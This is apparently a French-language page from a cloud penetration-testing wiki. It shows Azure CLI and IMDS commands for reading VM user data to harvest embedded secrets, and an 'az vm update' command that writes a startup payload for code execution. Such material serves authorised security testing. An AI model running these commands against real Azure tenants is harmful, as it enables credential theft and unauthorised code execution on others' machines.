---
title: "User data : lire les secrets cloud-init ou écrire un script de démarrage"
order: 4
description: "Lire le user data et cloud-init d'une VM Azure pour y trouver des secrets injectés, ou les écrire pour exécuter du code au démarrage."
keywords:
  - user data
  - cloud-init
  - VM
  - script de démarrage
  - secrets
---

# User data

Les VM Azure portent du **user data** (et du custom data cloud-init) que les scripts de provisionnement lisent au démarrage. Les opérateurs y laissent régulièrement des secrets, et le champ est lisible depuis le point de terminaison de métadonnées sur la machine ainsi que depuis le plan de gestion. Un accès en écriture vous permet d'y déposer un script qui s'exécute au prochain démarrage.

## Le lire

```bash
# from the management plane
az vm show -g <rg> -n <vm> --query userData -o tsv | base64 -d
# from inside the VM via IMDS
curl -s -H Metadata:true "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 -d
```

## Écrire une charge de démarrage

```bash
az vm update -g <rg> -n <vm> --set userData="$(base64 -w0 payload.sh)"
# combine with a stop/start, or pair with cloud-init custom-data on create
```

## Notes d'exploitation

- Parcourez (grep) le user data et le cloud-init récupérés à la recherche de mots de passe, de jetons SAS et de chaînes de connexion ; c'est un lieu de stockage courant pour ceux-ci.
- Le custom data n'est traité qu'au provisionnement, donc écrire du user data s'accompagne généralement d'un redémarrage ou de la [Custom Script Extension](custom-script-extension.md) pour une exécution immédiate.

## Outils

- **Azure CLI** (`az vm show`, `az vm update`).
- **MicroBurst** : collecte en masse des données de VM et des secrets.

## Références

- [Microsoft : user data pour les VM Azure](https://learn.microsoft.com/azure/virtual-machines/user-data)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud : Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
